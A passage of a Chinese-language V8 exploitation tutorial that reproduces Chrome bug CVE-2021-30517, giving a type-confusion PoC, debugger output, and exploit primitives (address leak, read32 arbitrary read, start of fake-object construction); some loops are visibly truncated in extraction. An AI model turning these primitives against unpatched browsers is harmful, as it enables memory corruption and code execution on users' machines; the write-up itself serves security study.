**作者：Hcamael@知道创宇404实验室**
**相关阅读：[从 0 开始学 V8 漏洞利用之环境搭建（一）](https://paper.seebug.org/1820/ "从 0 开始学 V8
漏洞利用之环境搭建（一）")  
[从 0 开始学 V8 漏洞利用之 V8 通用利用链（二）](https://paper.seebug.org/1821/ "从 0 开始学 V8
漏洞利用之 V8 通用利用链（二）")  
[从 0 开始学 V8 漏洞利用之 starctf 2019 OOB（三）](https://paper.seebug.org/1822/ "从 0 开始学
V8 漏洞利用之 starctf 2019 OOB（三）")  
[从 0 开始学 V8 漏洞利用之 CVE-2020-6507（四）](https://paper.seebug.org/1823/ "从 0 开始学 V8
漏洞利用之 CVE-2020-6507（四）")  
[从0开始学 V8 漏洞利用之 CVE-2021-30632（五）](https://paper.seebug.org/1824/ "从0开始学 V8
漏洞利用之 CVE-2021-30632（五）")  
[从 0 开始学 V8 漏洞利用之 CVE-2021-38001（六）](https://paper.seebug.org/1825/ "从 0 开始学
V8 漏洞利用之 CVE-2021-38001（六）")**
复现CVE-2021-30517
第五个研究的是`CVE-2021-30517`，其chrome的bug编号为：[1203122](https://bugs.chromium.org/p/chromium/issues/detail?id=1203122)
可以很容易找到其相关信息：
受影响的Chrome最高版本为：`90.0.4430.93` 受影响的V8最高版本为：`9.0.257.23`
相关PoC：
    function main() {
        class C {
            m() {
                super.prototype
            }
        }
        function f() {}
        C.prototype.__proto__ = f
        let c = new C()
        c.x0 = 1
        c.x1 = 1
        c.x2 = 1
        c.x3 = 1
        c.x4 = 0x42424242 / 2
        f.prototype
        c.m()
    }
    for (let i = 0; i  [FastProperties]
     - prototype: 0x32270820b899 
     - elements: 0x3227080889f5  [PACKED_ELEMENTS]
     - length: 1
     - properties: 0x32270804222d 
     - All own properties (excluding elements): {
        0x3227080446d1: [String] in ReadOnlySpace: #length: 0x32270818215d  (const accessor descriptor), location: descriptor
     }
     - elements: 0x3227080889f5  {
               0: 0x3227080889c9 
     }
    134777333
    hex(134777333) = 0x80889f5
最后返回的`length`等于`obj_array`变量的`elements`地址。理解了上文对类型混淆的讲解，应该能看懂上述的PoC，该PoC通过String和Array类型混淆，从而泄漏出`obj_array`变量的`elements`。根据该逻辑我们来编写EXP。
## 泄漏变量地址
    obj = {a:1};
    obj_array = [obj];
    class C {
        constructor() {
            this.x0 = obj_array;
        }
        m() {
            return super.length;
        }
    }
    let receive = new C();
    function trigger1() {   
        lookup_start_object = new String("aaaa");
        C.prototype.__proto__ = lookup_start_object;
        lookup_start_object.length;
        return receive.m()
    }
    for (let i = 0; i value(String+0xB)->length(*value+0x7)`
因为`receive2`对象通过漏洞被认为了是`String`对象，所以`receive2+0xB`的值为`receive2.length`属性的值。
所以我们可以通过`receive2.length`来设置`value`的值，但是只能设置为偶数，而正确的值应该为奇数，所以这里我们需要读两次，然后通过位运算，还原出我们实际需要的值。
## 编写read32函数
跟之前的模版不同，该漏洞能让我们在不构造`fake_obj`的情况下编写任意读函数，为了后续利用更方便，所以该漏洞的EXP我们加入了`read32`函数：
    function read32(addr)
    {
        receive2.length = (addr-0x8)/2;
        low3 = trigger2();
        receive2.length = (addr-0x8+0x2)/2;
        hi1 = trigger2();
        res = (low3/0x100) | (hi1 * 0x100 & 0xFF000000);
        return res;
    }
原理和`addressOf`一样。
## 编写read64函数
因为该漏洞的特性，我们这次不需要编写`fakeObject`函数，所以接下来我们需要构造`fake_obj`来编写`read64`函数。
多调试一下我们前文使用的PoC，该PoC只能泄漏地址，但是没办法让我们得到一个伪造的对象。但是文章的最开始，Chrome的bug页面中给的PoC，却可以让我们得到一个对象。因为是把函数的prototype对象进行类型混淆。
构造`fake_obj`的代码如下所示：
    var fake_array = [1.1, 2.2, 3.3, 4.4, 5.5];
    var fake_array_addr = addressOf(fake_array);
    fake_array_map = read32(fake_array_addr);